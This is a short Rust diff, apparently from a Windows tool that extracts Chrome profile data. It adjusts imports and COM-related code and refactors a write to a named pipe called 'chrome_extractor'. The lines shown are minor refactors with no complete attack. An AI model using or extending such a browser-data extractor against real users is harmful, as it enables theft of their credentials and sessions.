@@ -1,7 +1,10 @@
+use base64::Engine;
 use serde::{Deserialize, Serialize};
 use serde_json::Value;
+use std::ffi::OsStr;
 use std::fs;
 use std::io::Write;
+use std::os::windows::ffi::OsStrExt;
 use std::path::{Path, PathBuf};
 use std::ptr;
 use std::thread;
@@ -25,7 +28,7 @@ struct ProfileData {
 }
 
 use winapi::{
-    shared::{guiddef::GUID, minwindef::UINT, wtypes::BSTR, wtypesbase::CLSCTX_LOCAL_SERVER},
+    shared::{guiddef::GUID, minwindef::UINT, wtypes::BSTR},
     um::{
         combaseapi::{CoCreateInstance, CoInitializeEx, CoSetProxyBlanket, CoUninitialize},
         objbase::COINIT_APARTMENTTHREADED,
@@ -269,7 +272,7 @@ fn do_work() -> Result<(), Box<dyn std::error::Error>> {
     }
 
     unsafe {
-        let pipe_name: Vec<u16> = std::ffi::OsStr::new(r"\\.\pipe\chrome_extractor").encode_wide().chain(Some(0)).collect();
+        let pipe_name: Vec<u16> = OsStr::new(r"\\.\pipe\chrome_extractor").encode_wide().chain(Some(0)).collect();
         let mut handle = INVALID_HANDLE_VALUE;
         for _ in 0..30 {
             handle = CreateFileW(pipe_name.as_ptr(), GENERIC_WRITE, 0, ptr::null_mut(), OPEN_EXISTING, 0, ptr::null_mut());
